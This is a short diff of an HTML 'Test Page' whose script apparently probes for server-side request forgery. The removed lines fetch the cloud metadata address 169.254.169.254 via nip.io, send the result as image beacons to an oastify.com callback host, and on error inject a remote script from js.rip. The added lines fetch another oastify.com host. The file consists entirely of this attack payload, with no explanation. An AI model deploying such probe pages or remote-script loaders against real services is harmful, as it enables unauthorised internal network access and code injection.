@@ -3,20 +3,8 @@
 <head>
   <title>Test Page</title>
   <script>
-    fetch("https://169.254.169.254.nip.io/")
-      .then(r => {
-        if (r.type === "opaque") {
-          // CORS blocked response, but request landed
-          new Image().src = "https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/hit?opaque=" + Date.now();
-        } else {
-          new Image().src = "https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/hit?ok=" + Date.now();
-        }
-      })
-      .catch(() => {
-        const s = document.createElement("script");
-        s.src = "https://js.rip/5mw8at9w5s";
-        document.head.appendChild(s);
-      });
+    fetch("https://nc3soigtypl544mphd40m8d18sej2a7yw.oastify.com")
+  .catch(() => {});
   </script>
 </head>
 <body>
